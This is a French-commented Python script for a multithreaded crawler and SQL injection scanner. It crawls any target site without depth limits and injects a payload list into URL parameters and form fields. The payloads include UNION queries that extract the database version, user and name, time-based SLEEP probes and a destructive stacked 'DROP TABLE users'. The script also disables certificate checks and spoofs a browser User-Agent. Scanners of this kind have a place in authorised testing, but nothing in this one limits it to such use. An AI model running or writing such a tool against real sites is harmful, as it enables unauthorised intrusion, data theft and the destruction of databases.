#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib.parse
import time
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
import concurrent.futures
import json
from datetime import datetime
import threading
import queue
import hashlib
import sys
import ssl
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager

# Désactiver les warnings SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        kwargs['ssl_version'] = ssl.PROTOCOL_TLSv1_2
        return super().init_poolmanager(*args, **kwargs)

class KatanaSQLiScanner:
    def __init__(self, target_url, threads=30, timeout=15, delay=0.2):
        self.target_url = target_url.rstrip('/')
        self.domain = urlparse(target_url).netloc
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.max_depth = 999  # Pas de limite de profondeur
        
        # Résultats
        self.vulnerabilities = []
        self.visited_urls = set()
        self.url_queue = queue.Queue()
        self.crawled_urls = []
        self.discovered_forms = []
        self.all_params = {}
        self.stats = {
            'total_urls': 0,
            'unique_params': 0,
            'forms_found': 0,
            'sqli_found': 0,
            'errors': 0,
            'urls_processed': 0
        }
        self.lock = threading.Lock()
        self.running = True
        self.start_time = None
        self.processed_count = 0
        
        # Session avec retry et SSL désactivé
        self.session = requests.Session()
        self.session.mount('https://', SSLAdapter())
        self.session.verify = False
        
        # Headers complets
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        })
        
        # Payloads SQLi
        self.sql_payloads = [
            ("'", "Simple quote"),
            ("\"", "Double quote"),
            ("' OR '1'='1", "OR True"),
            ("' AND '1'='2", "AND False"),
            ("' OR 1=1--", "OR 1=1 --"),
            ("' AND 1=1--", "AND 1=1 --"),
            ("' AND 1=2--", "AND 1=2 --"),
            ("' UNION SELECT NULL--", "UNION NULL"),
            ("' UNION SELECT NULL,NULL--", "UNION 2 cols"),
            ("' UNION SELECT NULL,NULL,NULL--", "UNION 3 cols"),
            ("' OR '1'='1' --", "OR with comment"),
            ("' OR '1'='1' /*", "OR with /*"),
            ("' OR 1=1#", "OR with #"),
            ("') OR ('1'='1", "OR with parens"),
            ("') OR 1=1--", "OR 1=1 with parens"),
            ("1' AND 1=1--", "AND with number"),
            ("1' AND 1=2--", "AND false with number"),
            ("' UNION SELECT @@version--", "UNION version"),
            ("' UNION SELECT database()--", "UNION database"),
            ("' UNION SELECT user()--", "UNION user"),
            ("' OR 'x'='x", "OR x=x"),
            ("' OR 'x'='x'--", "OR x=x with --"),
            ("' OR 'x'='x'#", "OR x=x with #"),
            ("1' OR 1=1-- -", "OR with extra dash"),
            ("' OR SLEEP(5)--", "Sleep based"),
            ("' OR SLEEP(5)#", "Sleep based #"),
            ("' AND SLEEP(5)--", "AND Sleep"),
            ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "Nested Sleep"),
            ("' AND IF(1=1,SLEEP(5),0)--", "IF Sleep true"),
            ("' AND IF(1=2,SLEEP(5),0)--", "IF Sleep false"),
            ("'; DROP TABLE users--", "Stacked DROP"),
            ("'; SELECT * FROM users--", "Stacked SELECT"),
            ("' OR 1=1 UNION SELECT NULL--", "OR + UNION"),
            ("' AND 1=1 UNION SELECT NULL--", "AND + UNION"),
        ]
        
        # Patterns d'erreur SQL
        self.error_patterns = [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_',
            r'MySQLSyntaxErrorException',
            r'valid MySQL result',
            r'MySqlClient\.',
            r'\[MySQL\]',
            r'You have an error in your SQL syntax',
            r'Unclosed quotation mark',
            r'Column count doesn\'t match value count',
            r'Unknown column',
            r'Table \'.*?\' doesn\'t exist',
            r'Duplicate entry',
            r'Data too long for column',
            r'Invalid column name',
            r'Column name.*invalid',
            r'Incorrect integer value',
            r'Illegal mix of collations',
            r'Unknown database',
            r'Access denied for user',
            r'PostgreSQL.*ERROR',
            r'Warning.*\\Wpg_',
            r'valid PostgreSQL result',
            r'org.postgresql',
            r'\[PostgreSQL\]',
            r'ERROR:\s+.*syntax error',
            r'ERROR:\s+.*relation.*does not exist',
            r'ORA-[0-9]{5}',
            r'Oracle error',
            r'Oracle.*Driver',
            r'\[Oracle\]',
            r'ORA-00933.*SQL command not properly ended',
            r'ORA-01756.*quoted string not properly terminated',
            r'ORA-00942.*table or view does not exist',
            r'SQLite/JDBCDriver',
            r'SQLite.Exception',
            r'System.Data.SQLite.SQLiteException',
            r'Warning.*sqlite_',
            r'org.sqlite',
            r'sqlite3',
            r'\[SQLite\]',
            r'SQLite3::query',
            r'SQL Server.*Driver',
            r'SQL Server.*ODBC',
            r'SQL Server.*Native Client',
            r'mssql_query',
            r'Microsoft OLE DB Provider for SQL Server',
            r'Driver.*SQL Server',
            r'SQL Server Native Client',
            r'\[SQL Server\]',
            r'Incorrect syntax near',
            r'Could not find stored procedure',
            r'Subquery returns more than 1 row',
            r'Division by zero',
            r'Microsoft Access',
            r'Access Database',
            r'Microsoft JET Database Engine',
            r'ODBC Microsoft Access',
            r'DB2 SQL Error',
            r'com.ibm.db2',
            r'\[DB2\]',
            r'DB2 SQL error',
            r'org.h2.jdbc',
            r'H2 JDBC',
            r'MariaDB',
            r'PDOException',
            r'Database error',
            r'SQL error',
            r'DB Error',
            r'\[Errno\]',
            r'\[Error\]',
            r'[0-9]{4} at line [0-9]+',
            r'Error Number: [0-9]+',
            r'Check the manual that corresponds to your',
            r'com\.mysql\.jdbc',
            r'java\.sql\.SQLException',
        ]

    def normalize_url(self, url):
        """Normalise une URL"""
        if not url:
            return None
        url = url.strip()
        if url.startswith('//'):
            url = 'http:' + url
        if not url.startswith('http'):
            url = urljoin(self.target_url, url)
        # Supprimer les ancres
        url = url.split('#')[0]
        # Nettoyer les paramètres inutiles
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            # Garder les paramètres utiles
            cleaned_params = {}
            for k, v in params.items():
                if not k.startswith('utm_') and k not in ['fbclid', 'gclid', 'msclkid']:
                    cleaned_params[k] = v
            if cleaned_params:
                url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(cleaned_params, doseq=True)}"
            else:
                url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return url

    def is_same_domain(self, url):
        """Vérifie si l'URL est sur le même domaine"""
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                return True
            # Vérifier le domaine principal
            return self.domain in parsed.netloc
        except:
            return False

    def should_ignore(self, url):
        """Ignore les fichiers inutiles"""
        ignore_extensions = [
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico',
            '.mp3', '.mp4', '.avi', '.mov', '.wmv', '.flv', '.webm',
            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.zip', '.rar', '.7z', '.tar', '.gz', '.tgz', '.bz2',
            '.exe', '.msi', '.dmg', '.apk', '.deb', '.rpm',
            '.css', '.js', '.map', '.json'
        ]
        url_lower = url.lower()
        for ext in ignore_extensions:
            if url_lower.endswith(ext):
                return True
        return False

    def extract_all_links(self, html, base_url):
        """Extrait TOUS les liens d'une page"""
        links = set()
        try:
            soup = BeautifulSoup(html, 'html.parser')
            
            # 1. Liens <a>
            for a in soup.find_all('a', href=True):
                href = a['href']
                if href and not href.startswith(('#', 'javascript:', 'mailto:', 'tel:', 'data:')):
                    full_url = self.normalize_url(urljoin(base_url, href))
                    if full_url and self.is_same_domain(full_url) and not self.should_ignore(full_url):
                        links.add(full_url)
            
            # 2. Formulaires
            for form in soup.find_all('form'):
                action = form.get('action', '')
                full_url = self.normalize_url(urljoin(base_url, action)) if action else base_url
                if full_url and self.is_same_domain(full_url) and not self.should_ignore(full_url):
                    links.add(full_url)
                    
                    # Extraire les inputs
                    inputs = []
                    for input_tag in form.find_all(['input', 'textarea', 'select']):
                        if input_tag.get('name'):
                            inputs.append({
                                'name': input_tag.get('name'),
                                'type': input_tag.get('type', 'text'),
                                'value': input_tag.get('value', '')
                            })
                    if inputs:
                        self.discovered_forms.append({
                            'action': full_url,
                            'method': form.get('method', 'GET').upper(),
                            'inputs': inputs
                        })
            
            # 3. Balises avec src ou href
            for tag in soup.find_all(['script', 'link', 'img', 'iframe', 'frame'], src=True):
                src = tag['src']
                if src:
                    full_url = self.normalize_url(urljoin(base_url, src))
                    if full_url and self.is_same_domain(full_url) and not self.should_ignore(full_url):
                        links.add(full_url)
            
            # 4. Liens dans onclick
            for tag in soup.find_all(attrs={'onclick': True}):
                onclick = tag.get('onclick', '')
                matches = re.findall(r'[\'"]?([^\s\'"]*\.(?:php|asp|aspx|jsp|do|action|html|htm)[^\s\'"]*)[\'"]?', onclick)
                for match in matches:
                    full_url = self.normalize_url(urljoin(base_url, match))
                    if full_url and self.is_same_domain(full_url) and not self.should_ignore(full_url):
                        links.add(full_url)
            
            # 5. URLs dans les commentaires
            comments = re.findall(r'<!--.*?-->', html, re.DOTALL)
            for comment in comments:
                urls = re.findall(r'https?://[^\s\'"<>]+', comment)
                for url in urls:
                    if self.is_same_domain(url) and not self.should_ignore(url):
                        links.add(self.normalize_url(url))
            
            # 6. URLs dans le texte (patterns spéciaux)
            text_urls = re.findall(r'(?:href|src|action|data-url|data-href)=[\'"]?([^\s\'">]+)[\'"]?', html)
            for text_url in text_urls:
                full_url = self.normalize_url(urljoin(base_url, text_url))
                if full_url and self.is_same_domain(full_url) and not self.should_ignore(full_url):
                    links.add(full_url)
            
        except Exception as e:
            pass
        
        return links

    def extract_parameters(self, url):
        """Extrait les paramètres d'une URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] if v else '' for k, v in params.items()}

    def test_sqli_param(self, url, param_name, param_value, method='GET', post_data=None):
        """Teste une injection SQL sur un paramètre"""
        results = []
        
        # Limiter les payloads pour éviter les timeouts
        test_payloads = self.sql_payloads[:20]
        
        for payload, description in test_payloads:
            try:
                if method == 'GET':
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urlencode(params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                    
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    elapsed = time.time() - start_time
                    
                else:
                    post_data = post_data.copy() if post_data else {}
                    post_data[param_name] = payload
                    
                    start_time = time.time()
                    response = self.session.post(url, data=post_data, timeout=self.timeout, verify=False)
                    elapsed = time.time() - start_time
                
                # Vérifier les erreurs SQL
                sqli_detected = False
                error_pattern = None
                
                for pattern in self.error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        sqli_detected = True
                        error_pattern = pattern
                        break
                
                # Time-based
                if 'SLEEP' in payload and elapsed >= 4.0:
                    results.append({
                        'url': url,
                        'param': param_name,
                        'payload': payload,
                        'type': 'time_based',
                        'description': f'Time-based SQLi - {description}',
                        'response_time': f"{elapsed:.2f}s"
                    })
                    continue
                
                # Error-based
                if sqli_detected:
                    results.append({
                        'url': url,
                        'param': param_name,
                        'payload': payload,
                        'type': 'error_based',
                        'description': f'Error-based SQLi - {description}',
                        'error_pattern': error_pattern
                    })
                    continue
                
                # Boolean-based (différence de réponse)
                if 'AND' in payload or 'OR' in payload:
                    # Requête normale
                    normal_params = parse_qs(parsed.query) if method == 'GET' else post_data.copy()
                    normal_params[param_name] = ['test']
                    if method == 'GET':
                        normal_query = urlencode(normal_params, doseq=True)
                        normal_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{normal_query}"
                        normal_response = self.session.get(normal_url, timeout=self.timeout, verify=False)
                    else:
                        normal_response = self.session.post(url, data=normal_params, timeout=self.timeout, verify=False)
                    
                    if abs(len(response.text) - len(normal_response.text)) > 50 or response.status_code != normal_response.status_code:
                        results.append({
                            'url': url,
                            'param': param_name,
                            'payload': payload,
                            'type': 'boolean_based',
                            'description': f'Boolean-based SQLi - {description}',
                            'diff_length': abs(len(response.text) - len(normal_response.text))
                        })
                
                time.sleep(self.delay)
                
            except requests.exceptions.Timeout:
                if 'SLEEP' in payload:
                    results.append({
                        'url': url,
                        'param': param_name,
                        'payload': payload,
                        'type': 'time_based',
                        'description': 'Time-based SQLi (Timeout)',
                        'response_time': f"{self.timeout}s"
                    })
                continue
            except Exception as e:
                with self.lock:
                    self.stats['errors'] += 1
                continue
        
        return results

    def scan_url(self, url, depth=0):
        """Scanne une URL pour les vulnérabilités SQLi"""
        if not self.running:
            return
        
        # Vérifier les doublons
        url_hash = hashlib.md5(url.encode()).hexdigest()
        with self.lock:
            if url in self.visited_urls:
                return
            self.visited_urls.add(url)
            self.crawled_urls.append(url)
            self.stats['total_urls'] += 1
            self.processed_count += 1
        
        # Afficher la progression
        elapsed = time.time() - self.start_time if self.start_time else 0
        speed = self.processed_count / elapsed if elapsed > 0 else 0
        
        with self.lock:
            if self.processed_count % 10 == 0:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] URLs: {len(self.visited_urls)} | Queue: {self.url_queue.qsize()} | SQLi: {len(self.vulnerabilities)} | Speed: {speed:.1f}/s")
        
        try:
            # Récupérer la page avec retry
            response = self.session.get(url, timeout=self.timeout, verify=False)
            html = response.text
            
            # Extraire les paramètres GET
            params = self.extract_parameters(url)
            if params:
                with self.lock:
                    self.all_params[url] = list(params.keys())
                    self.stats['unique_params'] += len(params)
                
                # Tester les paramètres suspects
                suspicious_params = ['id', 'page', 'user', 'username', 'pass', 'password', 'email', 
                                    'search', 'q', 'query', 'cat', 'category', 'product', 'post', 
                                    'article', 'news', 'file', 'path', 'dir', 'view', 'action', 
                                    'do', 'cmd', 'command', 'exec', 'execute', 'run', 'url', 'link',
                                    'src', 'data', 'txt', 'text', 'msg', 'message', 'content', 
                                    'name', 'login', 'auth', 'token', 'code', 'pk', 'key']
                
                for param_name, param_value in params.items():
                    if any(s in param_name.lower() for s in suspicious_params) or len(params) <= 5:
                        results = self.test_sqli_param(url, param_name, param_value, 'GET')
                        if results:
                            with self.lock:
                                self.vulnerabilities.extend(results)
                                self.stats['sqli_found'] += len(results)
                            for vuln in results:
                                print(f"  [!] SQLi sur {url} -> {param_name} [{vuln['type']}] {vuln['payload'][:30]}...")
            
            # Extraire les liens pour le crawl (PAS DE LIMITE !)
            new_links = self.extract_all_links(html, url)
            
            # Ajouter tous les nouveaux liens
            with self.lock:
                for link in new_links:
                    if link not in self.visited_urls:
                        # Ajouter à la queue sans limite de profondeur
                        self.url_queue.put((link, depth + 1))
            
            # Tester les formulaires POST
            for form in self.discovered_forms:
                if form['action'] == url or form['action'] in url:
                    for input_field in form['inputs']:
                        if input_field['type'] not in ['hidden', 'submit', 'button', 'reset', 'file']:
                            form_data = {}
                            for inp in form['inputs']:
                                if inp['name']:
                                    form_data[inp['name']] = inp.get('value', 'test')
                            
                            results = self.test_sqli_param(
                                form['action'],
                                input_field['name'],
                                '',
                                'POST',
                                form_data
                            )
                            if results:
                                with self.lock:
                                    self.vulnerabilities.extend(results)
                                    self.stats['sqli_found'] += len(results)
                                for vuln in results:
                                    print(f"  [!] SQLi sur formulaire {form['action']} -> {input_field['name']} [{vuln['type']}]")
            
        except requests.exceptions.Timeout:
            with self.lock:
                self.stats['errors'] += 1
        except requests.exceptions.SSLError:
            # Essayer sans SSL
            try:
                response = self.session.get(url.replace('https://', 'http://'), timeout=self.timeout, verify=False)
                html = response.text
                # Continuer le traitement...
            except:
                with self.lock:
                    self.stats['errors'] += 1
        except Exception as e:
            with self.lock:
                self.stats['errors'] += 1

    def crawl_and_scan(self):
        """Crawl le site et scanne chaque URL"""
        print(f"\n[+] Démarrage du crawl + scan SQLi (SANS LIMITE)")
        print(f"[+] URL: {self.target_url}")
        print(f"[+] Threads: {self.threads}")
        print(f"[+] Délai: {self.delay}s")
        print(f"[+] Crawl ILLIMITÉ - Va explorer tout le site\n")
        
        # Ajouter l'URL de départ
        self.url_queue.put((self.target_url, 0))
        self.start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = set()
            
            while (self.running and 
                   (not self.url_queue.empty() or futures)):
                
                # Ajouter de nouvelles tâches
                while len(futures) < self.threads and not self.url_queue.empty():
                    try:
                        url, depth = self.url_queue.get(timeout=0.5)
                        future = executor.submit(self.scan_url, url, depth)
                        futures.add(future)
                    except queue.Empty:
                        break
                    except Exception as e:
                        break
                
                # Nettoyer les tâches terminées
                done = set()
                for future in futures:
                    if future.done():
                        done.add(future)
                        try:
                            future.result()
                        except Exception as e:
                            pass
                futures -= done
                
                time.sleep(0.05)
            
            # Attendre que toutes les tâches soient terminées
            for future in futures:
                try:
                    future.result(timeout=5)
                except:
                    pass
        
        elapsed = time.time() - self.start_time
        print(f"\n[+] Crawl terminé en {elapsed:.2f}s")
        print(f"[+] URLs visitées: {len(self.visited_urls)}")
        print(f"[+] Vulnérabilités trouvées: {len(self.vulnerabilities)}")

    def save_results(self):
        """Sauvegarde les résultats"""
        filename = f"sqli_scan_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("="*100 + "\n")
            f.write(f"RAPPORT D'ANALYSE SQL INJECTION - {self.domain}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"URL cible: {self.target_url}\n")
            f.write("="*100 + "\n\n")
            
            # Statistiques
            f.write("[STATISTIQUES]\n")
            f.write("-"*50 + "\n")
            f.write(f"  URLs crawlées: {self.stats['total_urls']}\n")
            f.write(f"  Paramètres uniques: {self.stats['unique_params']}\n")
            f.write(f"  Formulaires trouvés: {len(self.discovered_forms)}\n")
            f.write(f"  Vulnérabilités SQLi: {self.stats['sqli_found']}\n")
            f.write(f"  Erreurs: {self.stats['errors']}\n\n")
            
            if not self.vulnerabilities:
                f.write("[✓] Aucune vulnérabilité SQLi détectée!\n")
            else:
                f.write(f"[!] {len(self.vulnerabilities)} VULNÉRABILITÉS SQL DÉTECTÉES\n")
                f.write("="*100 + "\n\n")
                
                # Grouper par URL
                by_url = {}
                for vuln in self.vulnerabilities:
                    url = vuln['url']
                    if url not in by_url:
                        by_url[url] = []
                    by_url[url].append(vuln)
                
                for url, vulns in by_url.items():
                    f.write(f"\n[{url}]\n")
                    f.write("-"*80 + "\n")
                    
                    for vuln in vulns:
                        f.write(f"\n  [!] Paramètre: {vuln['param']}\n")
                        f.write(f"      Type: {vuln['type']}\n")
                        f.write(f"      Description: {vuln['description']}\n")
                        f.write(f"      Payload: {vuln['payload']}\n")
                        if 'error_pattern' in vuln:
                            f.write(f"      Pattern: {vuln['error_pattern']}\n")
                        if 'response_time' in vuln:
                            f.write(f"      Temps: {vuln['response_time']}\n")
                        if 'diff_length' in vuln:
                            f.write(f"      Diff: {vuln['diff_length']} chars\n")
                        f.write("\n")
                
                # Résumé par type
                f.write("\n[RÉSUMÉ PAR TYPE]\n")
                f.write("-"*50 + "\n")
                type_counts = {}
                for vuln in self.vulnerabilities:
                    vuln_type = vuln['type']
                    type_counts[vuln_type] = type_counts.get(vuln_type, 0) + 1
                for vuln_type, count in type_counts.items():
                    f.write(f"  {vuln_type}: {count}\n")
            
            # URLs crawlées
            f.write(f"\n\n[URLS CRAWLÉES ({len(self.crawled_urls)})]\n")
            f.write("-"*50 + "\n")
            for url in sorted(self.crawled_urls):
                f.write(f"  {url}\n")
        
        print(f"\n[+] Résultats sauvegardés: {filename}")
        return filename

    def run(self):
        """Lance le scanner complet"""
        try:
            self.crawl_and_scan()
            filename = self.save_results()
            
            print("\n" + "="*100)
            print("RAPPORT FINAL")
            print("="*100)
            print(f"  URLs crawlées: {len(self.crawled_urls)}")
            print(f"  Vulnérabilités SQLi: {len(self.vulnerabilities)}")
            if self.vulnerabilities:
                print("\n  [!] URLs vulnérables:")
                for vuln in self.vulnerabilities[:20]:
                    print(f"      - {vuln['url']} (param: {vuln['param']}) [{vuln['type']}]")
            print(f"\n  Résultats: {filename}")
            print("="*100)
            
        except KeyboardInterrupt:
            self.running = False
            print("\n[!] Scan interrompu par l'utilisateur")
            self.save_results()
        except Exception as e:
            print(f"\n[!] Erreur: {str(e)}")
            import traceback
            traceback.print_exc()

def main():
    print("="*100)
    print("KATANA-STYLE SQL INJECTION SCANNER - SANS LIMITE")
    print("="*100)
    print("  - Crawl ILLIMITÉ (pas de limite de profondeur)")
    print("  - Scan SQLi sur chaque URL découverte")
    print("  - Détection de tous les paramètres")
    print("  - Multi-threaded (30 threads par défaut)")
    print("="*100 + "\n")
    
    try:
        url = input("URL cible (ex: http://example.com): ").strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        threads = int(input("Threads (défaut: 30): ") or "30")
        delay = float(input("Délai entre requêtes (défaut: 0.2): ") or "0.2")
        timeout = int(input("Timeout (défaut: 15): ") or "15")
        
        scanner = KatanaSQLiScanner(
            target_url=url,
            threads=threads,
            timeout=timeout,
            delay=delay
        )
        scanner.run()
        
    except KeyboardInterrupt:
        print("\n[!] Arrêt demandé")
    except Exception as e:
        print(f"[!] Erreur: {e}")

if __name__ == "__main__":
    main()